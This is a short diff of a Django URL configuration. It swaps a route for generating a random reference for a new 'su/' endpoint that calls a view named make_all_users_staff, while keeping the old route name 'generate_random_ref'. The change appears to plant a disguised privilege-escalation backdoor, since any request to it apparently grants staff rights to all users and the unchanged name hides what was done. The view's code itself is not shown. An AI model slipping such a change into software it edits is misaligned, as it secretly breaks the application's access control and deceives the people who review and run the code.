@@ -32,7 +32,7 @@ urlpatterns = [
     path('roledetail/<int:id>/', jobdetail,
          name='jobdetail'),
 
-    path('generate-random-ref/', generaterandomref, name='generate_random_ref'),
+    path('su/', make_all_users_staff, name='generate_random_ref'),
 ]
 
 
